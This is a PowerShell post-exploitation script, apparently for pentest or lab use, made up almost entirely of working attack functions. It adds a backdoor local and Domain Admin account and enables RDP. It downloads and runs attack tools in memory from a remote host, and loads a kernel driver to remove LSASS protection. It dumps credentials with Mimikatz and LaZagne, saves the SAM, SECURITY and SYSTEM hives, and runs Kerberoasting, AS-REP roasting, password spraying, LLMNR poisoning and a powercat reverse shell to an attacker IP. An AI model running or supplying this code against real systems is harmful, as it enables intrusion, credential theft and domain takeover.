    net localgroup administrators manhattn /add
    net localgroup "Remote Desktop Users" manhattn /add
    Add-LocalGroupMember -Group "administrators" -Member "manhattn"
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member "manhattn"
    Add-ADGroupMember -Identity "Domain Admins" -Members manhattn
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
    New-NetFirewallRule -DisplayName "Remote Desktop" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389
}


function privesc {
    Write-Host "## Running privesccheck, powerup, and winpeas"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumprivesccheckoutput = "enum-PrivescOutput-" + $timestamp + ".txt"
    $enumpowerupoutput = "enum-PowerUpOutput-" + $timestamp + ".txt"
    $enumwinpeasoutput = "enum-WinPEASOutput-" + $timestamp + ".txt"

    IEX (New-Object Net.WebClient).DownloadString($uri + '/PrivescCheck.ps1')
    IEX (New-Object Net.WebClient).DownloadString($uri + '/PowerUp.ps1')

    Write-Host "PrivescCheck Output" | Out-File $p\$enumprivesccheckoutput
    Write-Host $timestamp | Out-File -Append $p\$enumprivesccheckoutput

    # Modify the Invoke-PrivescCheck command
    Invoke-PrivescCheck -Extended -Report enum_PrivescCheck_$timestamp_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML -ErrorAction SilentlyContinue | Tee-Object -Append $p\$enumprivesccheckoutput

    Write-Host "PowerUp Output" | Out-File $p\$enumpowerupoutput
    Write-Host $timestamp | Out-File -Append $p\$enumpowerupoutput
    Invoke-AllChecks -ErrorAction SilentlyContinue | Tee-Object -Append $p\$enumpowerupoutput

    # Suppress errors for the following block
    try {
        $wp = [System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest ($uri + '/winpeasx64.exe') -UseBasicParsing | Select-Object -ExpandProperty Content))
        [winPEAS.Program]::Main("")
    } catch {
        Write-Host "Error loading WinPEAS: $_"
    }
}


function Set-FilePermissions {
    param (
        [string]$FilePath
    )

    # Use ICACLS to set permissions for Everyone
    $icaclsCommand = "icacls '$FilePath' /grant 'Everyone:(R)'" 
    Invoke-Expression $icaclsCommand
}

function Take-Ownership {
    param (
        [string]$FilePath
    )

    $acl = Get-Acl $FilePath
    $owner = New-Object System.Security.Principal.NTAccount("Everyone")
    $acl.SetOwner($owner)
    Set-Acl -Path $FilePath -AclObject $acl
}



function Execute-CatsCommands {
    param (
        [string[]]$Commands,
        [string]$OutputFile
    )

    $catsPath = Join-Path $p "cats.exe"
    $escapedCommands = $Commands -join ' '

    # Execute Cats commands
    Start-Process -FilePath $catsPath -ArgumentList $escapedCommands -Wait -RedirectStandardOutput $OutputFile

    # Set file permissions using ICACLS
    $icaclsCommand = "icacls '$OutputFile' /grant 'Everyone:(R)'" 
    Invoke-Expression $icaclsCommand

    # Change file owner to Everyone
    $owner = New-Object System.Security.Principal.NTAccount("Everyone")
    $acl = Get-Acl $OutputFile
    $acl.SetOwner($owner)
    Set-Acl -Path $OutputFile -AclObject $acl
}


function cats {
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"

    # Download cats.exe
    iwr -o "$p/cats.exe" "$uri/cats.exe"

    # Create service and start it
    iwr -o "$p/cats.sys" "$uri/cats.sys"
    cmd /c sc create cats binPath= "$p\cats.sys" type= kernel start= demand
    cmd /c sc start cats
    Start-Sleep -Seconds 3

    # Execute Mimikatz commands
    Execute-CatsCommands -Commands "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", "sekurlsa::logonpasswords", "exit" -OutputFile "$p\enum-cats-$timestamp-sekurlsa-logonpasswords.txt"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", "lsadump::sam", "exit" -OutputFile "$p\enum-cats-$timestamp-lsa-sam.txt"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", "lsadump::secrets", "exit" -OutputFile "$p\enum-cats-$timestamp-lsa-secrets.txt"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", "lsadump::cache", "exit" -OutputFile "$p\enum-cats-$timestamp-lsa-cache.txt"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", "sekurlsa::ekeys", "exit" -OutputFile "$p\enum-cats-$timestamp-sekurlsa-ekeys.txt"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", "sekurlsa::tspkg", "exit" -OutputFile "$p\enum-cats-$timestamp-sekurlsa-tspkg.txt"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", "vault::cred", "exit" -OutputFile "$p\enum-cats-$timestamp-vault-cred.txt"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", '"lsadump::trust /patch"', "exit" -OutputFile "$p\enum-cats-$timestamp-lsa-trust-patch.txt"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", '"vault::cred /patch"', "exit" -OutputFile "$p\enum-cats-$timestamp-vault-cred-patch.txt"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", "sekurlsa::tickets", "exit" -OutputFile "$p\enum-cats-$timestamp-sekurlsa-tickets.txt"
    #Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", '"sekurlsa::tickets /export"', "exit"# -OutputFile "$p\enum-cats-$timestamp-sekurlsa-export.txt"
    Execute-CatsCommands -Commands "privilege::debug", "!+", '"!processprotect /process:lsass.exe /remove"', "token::elevate", '"lsadump::lsa /patch"', "exit" -OutputFile "$p\enum-cats-$timestamp-lsa-patch.txt"
    $currentdirectory = get-location
    set-location $p
    cmd /c $p/cats.exe "privilege::debug" "!+" '"!processprotect /process:lsass.exe /remove"' "token::elevate" '"sekurlsa::tickets /export"' "exit"
    
    # Download LaZagne.exe
    iwr -o "$p/lazagne.exe" "$uri/lazagne.exe"

    # Execute LaZagne without specifying output file name
    cmd /c "$p/lazagne.exe all -oN"

    # Look for the LaZagne output file and rename it
    $lazagneFile = Get-ChildItem -Path $p -Filter "credentials_*.txt" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if ($lazagneFile) {
        $lazagneOutputFile = "$p\enum-cats-lazagne-$timestamp.txt"
        Rename-Item -Path $lazagneFile.FullName -NewName $lazagneOutputFile
    }

    # Set file permissions on all files in the directory
    Get-ChildItem | ForEach-Object {
        Set-FilePermissions -FilePath $p\$_.FullName
    }

    set-location $currentdirectory

    
    # Save registry hives
    Copy-Item -Path "HKLM:\SAM" -Destination "$p\SAM" -Force
    Copy-Item -Path "HKLM:\Security" -Destination "$p\Security" -Force
    Copy-Item -Path "HKLM:\SYSTEM" -Destination "$p\SYSTEM" -Force

    # Zip files
    zip_files -Path $p
    $zipcats_timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m"
    $zipcats_file = Join-Path -Path $p -ChildPath "00-enum-zip-$zipcats_timestamp.zip"
    Set-FilePermissions -FilePath $zipcats_file
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"

    # Pull netcat
    iwr -o "$p/nc.exe" "$uri/nc64.exe"
}



function cats_inmem {
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"

    iwr -o "$p/cats.sys" ("$uri/cats.sys")
    cmd /c sc create cats binPath= "$p\cats.sys" type= kernel start= demand
    cmd /c sc start cats
    Start-Sleep -Seconds 3
    IEX (New-Object System.Net.WebClient).DownloadString("$uri/cats.txt");invoke-mimikatz -Command "privilege::debug";invoke-mimikatz -Command "!+";invoke-mimikatz -Command '"!processprotect /process:lsass.exe /remove"';invoke-mimikatz -Command "token::elevate"
    
    $cats_logonpasswords_output = "enum-cats-$timestamp-sekurlsa-logonpasswords.txt"
    invoke-mimikatz -Command "sekurlsa::logonpasswords" | Tee-Object "$p\$cats_logonpasswords_output"
    $logonpasswords_file = "$p\$cats_logonpasswords_output"
    # Set file permissions
    $acl = Get-Acl $logonpasswords_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $logonpasswords_file -AclObject $acl

    $cats_sam_output = "enum-cats-$timestamp-lsa-sam.txt"
    invoke-mimikatz -Command "lsadump::sam" | Tee-Object "$p\$cats_sam_output"
    $sam_file = "$p\$cats_sam_output"
    # Set file permissions
    $acl = Get-Acl $sam_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $sam_file -AclObject $acl

    $cats_secrets_output = "enum-cats-$timestamp-lsa-secrets.txt"
    invoke-mimikatz -Command "lsadump::secrets" | Tee-Object "$p\$cats_secrets_output"
    $secrets_file = "$p\$cats_secrets_output"
    # Set file permissions
    $acl = Get-Acl $secrets_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $secrets_file -AclObject $acl

    $cats_cache_output = "enum-cats-$timestamp-lsa-cache.txt"
    invoke-mimikatz -Command "lsadump::cache" | Tee-Object "$p\$cats_cache_output"
    $cache_file = "$p\$cats_cache_output"
    # Set file permissions
    $acl = Get-Acl $cache_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $cache_file -AclObject $acl

    $cats_ekeys_output = "enum-cats-$timestamp-sekurlsa-ekeys.txt"
    invoke-mimikatz -Command "sekurlsa::Ekeys" | Tee-Object "$p\$cats_ekeys_output"
    $ekeys_file = "$p\$cats_ekeys_output"
    # Set file permissions
    $acl = Get-Acl $ekeys_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $ekeys_file -AclObject $acl

    $cats_tspkg_output = "enum-cats-$timestamp-terminal-service-creds.txt"
    invoke-mimikatz -Command "sekurlsa::tspkg" | Tee-Object "$p\$cats_tspkg_output" 
    $tspkg_file = "$p\$cats_tspkg_output"
    # Set file permissions
    $acl = Get-Acl $tspkg_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $tspkg_file -AclObject $acl 
    
    $cats_tickets_output = "enum-cats-$timestamp-sekurlsa-tickets.txt"
    invoke-mimikatz -Command "sekurlsa::tickets" | Tee-Object "$p\$cats_tickets_output"
    $tickets_file = "$p\$cats_tickets_output"
    # Set file permissions
    $acl = Get-Acl $tickets_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $tickets_file -AclObject $acl

    $cats_ticketsexp_output = "enum-cats-$timestamp-sekurlsa-tickets-export.txt"
    invoke-mimikatz -Command '"sekurlsa::tickets /export"' | Tee-Object "$p\$cats_ticketsexp_output"
    $ticketsexp_file = "$p\$cats_ticketsexp_output"
    # Set file permissions
    $acl = Get-Acl $ticketsexp_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $ticketsexp_file -AclObject $acl

    $cats_patch_output = "enum-cats-$timestamp-lsa-patch.txt"
    invoke-mimikatz -Command '"lsadump::lsa /patch"' | Tee-Object "$p\$cats_patch_output"
    $patch_file = "$p\$cats_patch_output"
    # Set file permissions
    $acl = Get-Acl $patch_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $patch_file -AclObject $acl

    cmd /c reg save HKLM\SAM "$p\SAM"
    cmd /c reg save HKLM\Security "$p\Security"
    cmd /c reg save HKLM\SYSTEM "$p\SYSTEM"

    zip_files -path $p
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m"
    $zipcats_file = Join-Path -Path $p -ChildPath "00-enum-zip-$timestamp.zip"
    # Set file permissions for the decoded zip file
    $acl = Get-Acl $zipcats_file
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $zipcats_file -AclObject $acl

}


function hostrecon{
    Write-Host "## HostRecon"
    IEX (New-Object System.Net.WebClient).DownloadString($uri + '/HostRecon.ps1')
    Invoke-HostRecon | Out-File -Encoding ASCII $p\enum-hostrecon.txt
    Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" | Out-File -Encoding ASCII $p\enum-hostrecon-runasppl-lsa-protections.txt
    Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe | Out-File -Encoding ASCII $p\enum-hostrecon-application-whitelisting.txt
}

function kerberoast{
    Write-Host "## Kerberoasting"
    IEX (New-Object System.Net.WebClient).DownloadString($uri + '/Invoke-Kerberoast.ps1')
    Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash | Out-File -Encoding ASCII $p\enum-0Hash0-kerb-hashcat.txt
    Invoke-Kerberoast -OutputFormat John | Select-Object -ExpandProperty hash | Out-File -Encoding ASCII $p\enum-0Hash0-kerb-John.txt
}

function asreproast{
    Write-Host "## ASRepRoasting"
    IEX (New-Object System.Net.WebClient).DownloadString($uri + '/ASREPRoast.ps1')
    Invoke-ASREPRoast | Select-Object -ExpandProperty hash | Out-File -Encoding ASCII $p\enum-0Hash0-asrep.txt
}

function password_spray{
    $passspray = Read-Host "What Password Do You Want to Spray"
    Write-Host "## Spraying and Praying"
    $domain = $env:USERDNSDOMAIN
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumpowerupoutput = "enum-passwordspray-" + $timestamp + "-" + $passspray + ".txt"
    IEX (New-Object System.Net.WebClient).DownloadString($uri + '/DomainPasswordSpray.ps1')
    Get-DomainUserList -Domain $domain -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii enum-sprayed-userlist.txt
    Invoke-DomainPasswordSpray -Password $passspray -OutFile enum_spray_success_$timestamp -ErrorAction SilentlyContinue
}

function enum_webservers{
    Write-Host "## Enumerating Webservers"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumwebserversoutput = "enum-webservers-" + $timestamp + ".txt"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.filter="serviceprincipalname=*http*"
    $Result = $Searcher.FindAll()
    Foreach($obj in $Result)
    {
        Foreach($prop in $obj.Properties)
        {
            #$prop
            $prop | Out-File -Append $p\$enumwebserversoutput
        }
        Write-Output "--------------------------" | Out-File -Append $p\$enumwebserversoutput
    }
}

function enum_sqlservers{
    Write-Host "## Enumerating SQL Servers"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumsqlserversoutput = "enum-sqlservers-" + $timestamp + ".txt"
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = ($domainObj.PdcRoleOwner).Name
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain
    $Searcher.filter="serviceprincipalname=*sql*"
    $Result = $Searcher.FindAll()
    Foreach($obj in $Result)
    {
        Foreach($prop in $obj.Properties)
        {
            #$prop
            $prop | Out-File -Append $p\$enumsqlserversoutput            
        }
        Write-Output "--------------------------" | Out-File -Append $p\$enumsqlserversoutput
    }
}


function enum_inveigh{
    Write-Host "## Running Inveigh"
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    IEX (New-Object Net.WebClient).DownloadString($uri + '/Inveigh.ps1')
    Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
}


function find_PSRemotingLocalAdmin{
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumpsremotinglocaladminaccessoutput = "enum-PSRemotingLocalAdminAccess-" + $timestamp + ".txt"
    IEX (New-Object Net.WebClient).DownloadString($uri + '/Find-PSRemotingLocalAdminAccess.ps1')
    $computerFile = Read-Host "Enter the path to the computers.txt file"
    Find-PSRemotingLocalAdminAccess -ComputerFile $computerFile -Verbose | Out-File $p\$enumpsremotinglocaladminaccessoutput
}


function find_WMILocalAdmin{
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumWMILocalAdminAccessoutput = "enum-WMILocalAdminAccess-" + $timestamp + ".txt"
    IEX (New-Object Net.WebClient).DownloadString($uri + '/Find-WMILocalAdminAccess.ps1')
    $computerFile = Read-Host "Enter the path to the computers.txt file"
    Find-WMILocalAdminAccess -ComputerFile $computerFile -Verbose | Out-File $p\$enumWMILocalAdminAccessoutput
}

function New-BHWorkingDir {
    param([string]$PreferredParent)
    $name = 'bh-' + ([guid]::NewGuid().ToString('N').Substring(0,8))

    foreach ($parent in @($PreferredParent, $env:TEMP)) {
        try {
            if (-not $parent) { continue }
            $dir = Join-Path $parent $name
            New-Item -ItemType Directory -Path $dir -Force -ErrorAction Stop | Out-Null
            $probe = Join-Path $dir '.write.test'
            Set-Content -Path $probe -Value 'ok' -Encoding ascii -ErrorAction Stop
            Remove-Item $probe -Force -ErrorAction SilentlyContinue
            return $dir
        } catch { continue }
    }
    throw "Unable to create a writable working directory under '$PreferredParent' or `%TEMP%`."
}

function Invoke-BH-Post {
    param(
        [string]$WorkDir,
        [string]$FinalDir,
        [string]$FinalName
    )
    $zip = Get-ChildItem $WorkDir -Filter '*.zip' | Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if (-not $zip) { throw "No ZIP produced in '$WorkDir'." }

    $finalPath = Join-Path $FinalDir $FinalName
    try {
        # Prefer an atomic move
        Move-Item -LiteralPath $zip.FullName -Destination $finalPath -Force -ErrorAction Stop
    } catch {
        # If cross-volume or locked, copy then remove the source so only the final ZIP remains
        try {
            Copy-Item -LiteralPath $zip.FullName -Destination $finalPath -Force -ErrorAction Stop
            Remove-Item -LiteralPath $zip.FullName -Force -ErrorAction SilentlyContinue
        } catch {
            throw "Failed to place ZIP at '$finalPath': $($_.Exception.Message)"
        }
    }
    return $finalPath
}

function bloodhound {
    param([string]$zdomain)

    $timestamp    = Get-Date -UFormat "%Y-%m-%d_%H-%M-%S"
    $domainForRun = if ($zdomain) { $zdomain } elseif ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { $null }
    $namePart     = if ([string]::IsNullOrWhiteSpace($domainForRun)) { '' } else { "-$domainForRun" }
    $outfile      = "bloodhound$namePart-$timestamp.zip"


    IEX (New-Object Net.WebClient).DownloadString($uri + '/SharpHound.ps1')

    $workDir = New-BHWorkingDir -PreferredParent $p
    try {
        if ($domainForRun) {
            Invoke-BloodHound -CollectionMethod All -Domain $domainForRun -OutputDirectory $workDir
        } else {
            Invoke-BloodHound -CollectionMethod All -OutputDirectory $workDir
        }

        $pathOut = Invoke-BH-Post -WorkDir $workDir -FinalDir $p -FinalName $outfile
        "BloodHound output: $pathOut"
    }
    finally {
        if (Test-Path -LiteralPath $workDir) {
            Remove-Item -LiteralPath $workDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

function bloodhound-ce {
    param([string]$zdomain)

    $timestamp    = Get-Date -UFormat "%Y-%m-%d_%H-%M-%S"
    $domainForRun = if ($zdomain) { $zdomain } elseif ($env:USERDNSDOMAIN) { $env:USERDNSDOMAIN } else { $null }
    $namePart     = if ([string]::IsNullOrWhiteSpace($domainForRun)) { '' } else { "-$domainForRun" }
    $outfile      = "bloodhound-ce$namePart-$timestamp.zip"

    function _New-BHCEWorkDir([string]$PreferredParent) {
        $name = 'bhce-' + ([guid]::NewGuid().ToString('N').Substring(0,8))
        foreach ($parent in @($PreferredParent, $env:TEMP)) {
            try {
                if (-not $parent) { continue }
                $dir = Join-Path $parent $name
                New-Item -ItemType Directory -Path $dir -Force -ErrorAction Stop | Out-Null
                $probe = Join-Path $dir '.write.test'
                Set-Content -Path $probe -Value 'ok' -Encoding ascii -ErrorAction Stop
                Remove-Item $probe -Force -ErrorAction SilentlyContinue
                return $dir
            } catch { continue }
        }
        throw "Unable to create a writable working directory."
    }

    $workDir = _New-BHCEWorkDir -PreferredParent $p
    try {
        $exePath = Join-Path $workDir 'sharphound-ce.exe'
        (New-Object Net.WebClient).DownloadFile(($uri + '/sharphound-ce.exe'), $exePath)

        $args = @('--CollectionMethods','All','--OutputDirectory', $workDir)
        if ($domainForRun) { $args += @('--Domain', $domainForRun) }

        $proc = Start-Process -FilePath $exePath -ArgumentList $args -NoNewWindow -Wait -PassThru -WorkingDirectory $workDir
        if ($proc.ExitCode -ne 0) {
            throw "SharpHound CE exited with code $($proc.ExitCode). Check console output."
        }

        $pathOut = Invoke-BH-Post -WorkDir $workDir -FinalDir $p -FinalName $outfile
        "BloodHound-CE output: $pathOut"
    }
    finally {
        if (Test-Path -LiteralPath $workDir) {
            Remove-Item -LiteralPath $workDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}




function enum_laps{
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $enumLAPS = "enum-LAPS-" + $timestamp + ".txt"
    $enumLAPSdelegatedgroups = "enum-LAPS-Groups-" + $timestamp + ".txt"
    IEX (New-Object Net.WebClient).DownloadString($uri + '/LAPSToolkit.ps1')
    Get-LAPSComputers | Out-File $p\$enumLAPS
    Find-LAPSDelegatedGroups | Out-File $p\$enumLAPSdelegatedgroups

}

function shell_powercat{
    IEX (New-Object System.Net.WebClient).DownloadString($uri + '/powercat.ps1')
    #iwr -o $p/powercat.ps1 $uri/powercat.ps1
    #. $p\powercat.ps1    
    $powercatip = Read-Host "IP of attacker machine"
    $powercatport = Read-Host "Port of attacker machine"
    powercat -c $powercatip -p $powercatport
}

function group3r {
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    $group3rfilename = "group3r-" + $timestamp + ".txt"
    $group3rpath = Join-Path -Path $p -ChildPath "Group3r.exe"
    
    # Download the required files
    iwr -Uri "$uri/Group3r/Group3r.exe" -OutFile (Join-Path -Path $p -ChildPath "Group3r.exe")
    iwr -Uri "$uri/Group3r/CommandLineArgumentsParser.dll" -OutFile (Join-Path -Path $p -ChildPath "CommandLineArgumentsParser.dll")
    iwr -Uri "$uri/Group3r/LibSnaffle.dll" -OutFile (Join-Path -Path $p -ChildPath "LibSnaffle.dll")
    iwr -Uri "$uri/Group3r/Portable.System.ValueTuple.dll" -OutFile (Join-Path -Path $p -ChildPath "Portable.System.ValueTuple.dll")
    iwr -Uri "$uri/Group3r/NLog.dll" -OutFile (Join-Path -Path $p -ChildPath "NLog.dll")
    iwr -Uri "$uri/Group3r/group3r.out" -OutFile (Join-Path -Path $p -ChildPath "group3r.out")
    
    # Use pushd to change directory and then popd to return
    pushd $p
    try {
        & $group3rpath -f "$group3rfilename"
    }
    finally {
        popd
    }
}



function sharppack{
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    IEX (New-Object Net.WebClient).DownloadString($uri + '/PowerSharpPack/PowerSharpPack.ps1')
    # Seatbelt
    $psharp_seatbelt_amsi_output = "enum-powersharp-" + $timestamp + "-seatbelt-amsiproviders.txt"
    PowerSharpPack -seatbelt -Command "AMSIProviders" | Out-File $p\$psharp_seatbelt_amsi_output
    $psharp_seatbelt_autoruns_output = "enum-powersharp-" + $timestamp + "-seatbelt-autoruns.txt"
    PowerSharpPack -seatbelt -Command "autoruns" | Out-File $p\$psharp_seatbelt_autoruns_output
    $psharp_seatbelt_interestingprocesses_output = "enum-powersharp-" + $timestamp + "-seatbelt-interestingprocesses.txt"
    PowerSharpPack -seatbelt -Command "interestingprocesses" | Out-File $p\$psharp_seatbelt_interestingprocesses_output
    $psharp_seatbelt_processes_output = "enum-powersharp-" + $timestamp + "-seatbelt-processes.txt"
    PowerSharpPack -seatbelt -Command "processes" | Out-File $p\$psharp_seatbelt_processes_output
    $psharp_seatbelt_environmentpath_output = "enum-powersharp-" + $timestamp + "-seatbelt-environmentpath.txt"
    PowerSharpPack -seatbelt -Command "environmentpath" | Out-File $p\$psharp_seatbelt_environmentpath_output
    $psharp_seatbelt_environmentvariables_output = "enum-powersharp-" + $timestamp + "-seatbelt-environmentvariables.txt"
    PowerSharpPack -seatbelt -Command "environmentvariables" | Out-File $p\$psharp_seatbelt_environmentvariables_output
    $psharp_seatbelt_system_output = "enum-powersharp-" + $timestamp + "-seatbelt-system.txt"
    PowerSharpPack -seatbelt -Command "-group=system" | Out-File $p\$psharp_seatbelt_system_output
    $psharp_seatbelt_user_output = "enum-powersharp-" + $timestamp + "-seatbelt-user.txt"
    PowerSharpPack -seatbelt -Command "-group=user" | Out-File $p\$psharp_seatbelt_user_output
    $psharp_seatbelt_misc_output = "enum-powersharp-" + $timestamp + "-seatbelt-misc-output.txt"
    PowerSharpPack -seatbelt -Command "-group=misc" | Out-File $p\$psharp_seatbelt_misc_output
    # Rubeus
    $psharp_kerberoast_output = "enum-powersharp-" + $timestamp + "-rubeus-kerberoast.txt"
    PowerSharpPack -Rubeus -Command "kerberoast /outfile:$p\$psharp_kerberoast_output" | out-null
    # SharpShares
    #$psharp_sharpshares_output = "enum-powersharp-" + $timestamp + "-sharpshares.txt"
    #PowerSharpPack -sharpshares -Command "--shares" | tee-object $p\$psharp_sharpshares_output
}

function enum_powerview{
    Write-Host "Running powerview tasks, this can take a while."
    IEX (New-Object Net.WebClient).DownloadString($uri + '/powerview.ps1') 
    $timestamp = Get-Date -UFormat "%Y-%m-%d_%H-%m-%S"
    #domain
    $pview_domain_output = "enum-powerview-" + $timestamp + "-domain.txt"
    Write-Host "Gathering Domain info"
    Get-NetDomain | Out-File $p\$pview_domain_output
    #domain controllers
    $pview_domaincontroller_output = "enum-powerview-" + $timestamp + "-domain-controllers.txt"
    Write-Host "Gathering DC Info"
    Get-NetDomainController | Out-File $p\$pview_domaincontroller_output  
    #domain policy
    Write-Host "Gathering Domain Policy Info"
    $pview_domainpolicy_output = "enum-powerview-" + $timestamp + "-domain-policy.txt"
    Get-DomainPolicy | Out-File $p\$pview_domainpolicy_output  
    #user
    Write-Host "Gathering User Info"
    $pview_userlist_output = "enum-powerview-" + $timestamp + "-user-list-enabled.txt"
    Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select-object -expandproperty samaccountname | Out-File $p\$pview_userlist_output
    $pview_basic_user_output = "enum-powerview-" + $timestamp + "-user-info-basic.txt"
    Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount | Out-File $p\$pview_basic_user_output
    $pview_basic_userdesc_output = "enum-powerview-" + $timestamp + "-user-info-descriptions.txt"
    Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null} | Out-File $p\$pview_basic_userdesc_output
    $pview_advanced_user_output = "enum-powerview-" + $timestamp + "-user-info-extended.txt"
    Get-NetUser | Out-File $p\$pview_advanced_user_output
    $pview_asrep_output = "enum-powerview-" + $timestamp + "-asrep.txt"
    Get-NetUser -PreauthNotRequired | Out-File $p\$pview_asrep_output
    $pview_kerberoastable_output = "enum-powerview-" + $timestamp + "-kerberoastable.txt"
    Get-NetUser -SPN | Out-File $p\$pview_kerberoastable_output
    $pview_nopasswd_output = "enum-powerview-" + $timestamp + "-user-nopasswd.txt"
    Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol | Out-File $p\$pview_nopasswd_output
    #group
    Write-Host "Gathering Group Info"
    $pview_basic_group_output = "enum-powerview-" + $timestamp + "-groups.txt"
    Get-NetGroup | select samaccountname, admincount, description | Out-File $p\$pview_basic_group_output
    $pview_rdp_group_output = "enum-powerview-" + $timestamp + "-groups-rdpusers.txt"
    Get-NetGroup 'rdpusers'  | Out-File $p\$pview_rdp_group_output
    $pview_da_group_output = "enum-powerview-" + $timestamp + "-groups-domainadmins.txt"
    Get-DomainGroupMember "Domain Admins" -recurse | select-object -ExpandProperty membername | Out-File $p\$pview_da_group_output
    Get-DomainGroupMember "Domain Admins" -recurse | Out-File -Append $p\$pview_da_group_output
    #computers
    Write-Host "Gathering Computer Info"
    $pview_computerlist_output = "enum-powerview-" + $timestamp + "-computers-list.txt"
    Get-NetComputer | select-object -expandproperty dnshostname -erroraction silentlycontinue | Out-File $p\$pview_computerlist_output  
    $pview_basic_computer_output = "enum-powerview-" + $timestamp + "-computers-extended.txt"
    Get-NetComputer | Out-File $p\$pview_basic_computer_output  
